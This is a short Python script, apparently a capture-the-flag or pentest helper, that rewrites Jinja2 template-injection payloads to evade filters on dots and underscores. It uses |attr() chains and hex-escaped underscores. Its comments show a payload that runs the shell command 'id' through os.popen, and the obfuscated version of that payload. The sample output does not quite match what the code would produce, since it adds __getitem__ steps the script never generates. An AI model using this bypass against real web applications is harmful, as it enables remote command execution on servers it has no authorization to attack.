payload = input()

payload = payload.split(".")
tmp = ''

for i in payload:
    if i.startswith('{{'):
        tmp = tmp + i
        continue
    else:
        parts = i.split('(')
        func_name = parts[0]
        args = ''.join('(' + part for part in parts[1:])
        tmp = tmp + "|attr('" + func_name + "')" + args

payload = tmp.replace("_", "\\x5f")
print(payload)
# Bypassing the blocks on “.”, “_”, “[]”



#example : {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

#Become: {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

